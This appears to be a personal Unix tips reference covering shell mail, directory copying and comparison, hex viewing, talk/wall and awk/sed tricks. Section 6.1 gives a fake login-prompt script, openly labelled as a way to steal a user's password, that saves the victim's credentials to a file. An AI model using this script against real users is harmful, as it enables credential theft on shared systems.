---
type: reference
title: Advanced tricks
description: "Advanced Unix tricks: turning off echo, login scripts and sending mail from the shell."
tags: [shell, unix, email, tips, legacy]
generated: { by: "human:izaqyos", at: "2026-04-10T12:41:42Z" }
status: stable
capture_type: source
legacy_source: "unix-kb#6"
---

# Advanced tricks

[↑ unix-kb](/kb-unix/README.md)

## 6.1. turn off echo of keystrokes. and steal a user's password.

```text
		echo "Closed Connection."
		echo; echo;
		echo -n "login: "; read NAME
		echo -n "Password: ";
		stty -echo; read PASSWD; stty echo
		echo "$NAME:$PASSWD" > /users/<user>/passwords	

	6.2. Locate a machine in the lab. Will only work in Unix flavours that enable making this sound (Most Linux won't).
```

### 6.2.1 login as root.

### 6.2.2 issue

```text
			$ while true; do echo "I'm here <\\007>" > /dev/syscon ; sleep 2; done
```

## 6.3. send mail.

### 6.3.1 from shell mailx

### 6.3.2 perl send_mail

## 6.4. copy dir tree including symbolic links.

### 6.4.1 $find . -follow | cpio -pd <target dir>

```text
		or, create archive: (add -L to follow symbolic links)
		$ find [dir name]  | cpio -vo | compress > [dir name].cpio.Z
		open archive:
		$ zcat [dir name].file.cpio.Z | cpio -idvm
```

### 6.4.2 $tar cvfh tarfile src_dir

## 6.5 view hex.

```text
	$ od -x <file name>

	view printable Characters
	od -c file

	check file encoding
	file filename
```

## 6.6 compare directories content.

### 6.6.1 $ dircmp dir1 dir2

```text
		on cygwin (no dircmp)
		either 
		$ for file in `ls *`; do tdiff $file /cygdrive/d/temp/temp/ ; done; 

		sometime, due to a strange quirk this wouldn't work then do:

		$ for file in `ls *`; do echo tdiff $file /cygdrive/d/temp/temp/ ; done; 
		copy paste into file stam and then
		$ source ./stam
```

### 6.6.2 Compare mainly binary files directoris

```text
		Step1:
		go to Dir1 and perform,
		md5sum * | awk '{print $2" " $1}' | sort > Dir1_content
		go to Dir2 and perform,
		md5sum * | awk '{print $2" " $1}' | sort > Dir2_content

		Then diff Dir1_content Dir2_content

		For comparing recursively perform a similiar step using find:
		go to Dir1 and perform,
		find .  | xargs md5sum | awk '{print $2 " " $1}' | sort > Dir1_content
		go to Dir2 and perform,
		find .  | xargs md5sum | awk '{print $2 " " $1}' | sort > Dir2_content
```

### 6.6.3 text diff

```text
		diff -r <dir1> <dir2>
```

## 6.7 Talk to another user on same system.

```text
		$ talk <user name>
```

## 6.8 Broadcast message on unix system

```text
		$wall 
		<enter text>
		^D
```

## 6.9 To send message to a specific user

```text
	$talk user
```

## 6.10 To create a low level TCP connection do:

```text
	$ telnet -E <ip> <port>
The -E disables escape chars. This can be used to manually issue Application level commands (such as ftp, http etc).
```

## 6.11 Remove every second (or nth) line from a file.

### 6.11.1 with awk.

```text
			$ awk 'NR%2 != 0'  filename
```

### 6.11.2 with sed.

```text
			$ sed -n 'p;N'   readme_orig_markov1_gplot_sorted
			p keeps the first line and N removes the second add more p and N for more complex removals.
```
